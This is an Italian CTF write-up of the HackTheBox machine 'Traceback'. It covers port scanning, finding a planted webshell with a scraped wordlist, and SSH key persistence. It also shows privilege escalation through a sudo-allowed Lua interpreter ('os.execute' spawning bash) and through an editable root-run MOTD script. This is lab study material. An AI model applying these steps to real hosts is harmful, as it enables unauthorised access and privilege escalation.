## Information Gathering

Sembrerebbe una macchina molto semplice. Comincio con una scan basilare:

```
nmap -Pn -T5 -A traceback.htb
```

Scopro dunque un servizio particolare aperto sulla porta 50002:

```
Nmap scan report for traceback.htb (10.10.10.181)
Host is up (0.42s latency).
Not shown: 997 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
50002/tcp filtered iiimsf

Nmap done: 1 IP address (1 host up) scanned in 107.51 seconds
```

Visito il servizio in ascolto sulla porta 80 e scopro una pagina web che cita:

> This site has been owned
> I have left a backdoor for all the net. FREE INTERNETZZZ
> - Xh4H - 

Ne leggo il codice sorgente e scopro l'hint:

> Some of the best web shells that you might need ;)

A questo punto capisco che c'è una webshell nascosta all'interno dell'host. Quello che faccio è generarmi un listato di tutte le webshell più comuni partendo da questa [repository](https://github.com/JohnTroony/php-webshells/tree/master/Collection), quindi estraendo tutti i nomi delle webshell grazie ad uno scriptino in python:

```
import requests
from bs4 import BeautifulSoup

req = requests.get("https://github.com/JohnTroony/php-webshells/tree/master/Collection")
soup = BeautifulSoup(req.txt, features="html.parser")

for tag2 in soup.findAll("a", {"class": "js-navigation-open"}):
    print tag2.text
```

Generata la wordlist la do in pasto a dirbuster e scopro effettivamente la presenza del tab "smevk.php".

## WebExploitation

Visito la pagina e trovo un form di login. Provo banalmente con le creds "admin:admin" ed entro. 

Leggo innanzitutto il file note.txt e mi da un indizio, mi dice che devo sfruttare uno scriptino "lua" che è stato lasciato in giro. Dentro la home folder trovo le cartelle di due utenti: webadmin e sysadmin. Io sono webadmin e, ovviamente, il flag è dentro sysadmin. Ma non ho i privilegi per aprirlo. 

_Avrei potuto eseguire tutto a mano tramite webshell ma per comodità, avendo rintracciato il file "authorized_keys" dentro .ssh, mi apro una connessione via ssh_

Quindi genero una coppia di rsa_keys con *rsa-keygen*, carico la chiave pubblica dentro al file sopracitato dando da webshell il comando:

```
echo "pub_key[...]" > authorized_keys
```

Quindi entro in ssh da locale con: 

```
ssh -i id-rsa webadmin@traceback.htb
```

Inserendo quindi la passphrase (che conoscevo) che avevo inserito in fase di creazione della coppia di chiavi. 

## Privilege Escalation

### Sysadmin

Ritornando allo step precedente, devo effettuare un piccolo privilege escalation da *Webadmin* a *Sysadmin*. La prima cosa che faccio è un:

```
sudo -l
cat .bash_histoy
```

Scopro così che l'utente *webadmin* può eseguire in sudo senza password a nome di *sysadmin* lo script in _home/sysadmin/*luvit*_ . Incrociando questo, con quanto scoperto su GTFOBins in merito agli script LUA, riesco ad aprirmi una shell con l'utenza di Sysadmin:

```
echo "os.execute("/bin/bash -i")" > /home/webadmin/privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
```
Ed ecco aperta una shell con l'utenza _SysAdmin_ e prelevo lo user.txt flag! 

### Root

A questo punto mi sposto in /tmp, creo una copia di LinEnum, lo eseguo, ma non rintraccio nulla. Considerato che lui non ha portato risultati provo con PsPy e scopro che Root invoca il banner di benvenuto quando qualcuno si collega via SSH. Quindi trovo che SysAdmin può editare il banner di benvenuto SSH locato in:

```
etc/update-motd.d/00-header
```

A questo punto il gioco è fatto, posso scegliere se stampre il flag o aprire una root shell modificando il file. 
